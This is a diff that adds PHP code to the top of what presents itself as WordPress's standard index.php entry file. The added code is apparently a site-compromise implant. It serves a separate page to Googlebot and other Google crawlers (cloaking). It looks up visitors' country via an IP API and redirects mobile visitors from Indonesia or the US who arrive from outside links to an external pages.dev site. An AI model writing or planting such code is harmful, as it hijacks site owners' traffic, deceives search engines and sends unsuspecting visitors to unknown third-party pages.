@@ -1,0 +1,86 @@
+<?php
+function getUserIP() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    } else {
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+    return $ip;
+}
+function isMobileUserAgent($userAgent = null) {
+    if ($userAgent === null) {
+        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    }
+
+    $mobileAgents = '/(android|iphone|ipad|ipod|blackberry|windows phone|opera mini|mobile|webos|palm|symbian|nokia|fennec|htc|motorola|samsung|tablet)/i';
+
+    return preg_match($mobileAgents, $userAgent) === 1;
+}
+$ip = getUserIP();
+$api_url = "http://ip-api.com/json/{$ip}";
+$response = file_get_contents($api_url);
+$data = json_decode($response, true);
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$referer   = $_SERVER['HTTP_REFERER'] ?? '';
+$host      = $_SERVER['HTTP_HOST'] ?? '';
+$isGoogleBot = false;
+$hasExternalReferer = false;
+// Daftar User-Agent crawler Google
+$googleUserAgents = [
+    'Googlebot',
+    'Googlebot/2.1',
+    'Googlebot-Image',
+    'Googlebot-News',
+    'Googlebot-Video',
+    'AdsBot-Google',
+    'AdsBot-Google-Mobile',
+    'Googlebot-Mobile',
+    'APIs-Google',
+    'Mediapartners-Google',
+    'Feedfetcher-Google',
+    'Google-InspectionTool'
+];
+// Cek apakah User-Agent cocok dengan salah satu crawler Google
+foreach ($googleUserAgents as $bot) {
+    if (stripos($userAgent, $bot) !== false) {
+        $isGoogleBot = true;
+        break;
+    }
+}
+// Cek apakah referer berasal dari luar domain sendiri
+if (!empty($referer)) {
+    $refererHost = parse_url($referer, PHP_URL_HOST);
+    if ($refererHost && stripos($refererHost, $host) === false) {
+        $hasExternalReferer = true;
+    }
+}
+if ($isGoogleBot) {
+    ob_start();
+    include 'pageone.php';
+    $output = ob_get_clean();
+    echo $output;
+    exit();
+}
+if (isMobileUserAgent()  && $hasExternalReferer && ($data['countryCode'] === 'ID' || $data['countryCode'] === 'US')) {
+    // Redirect or serve mobile content
+    header('Location: https://engustedusd.pages.dev/amp/index.html');
+    exit;
+}
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
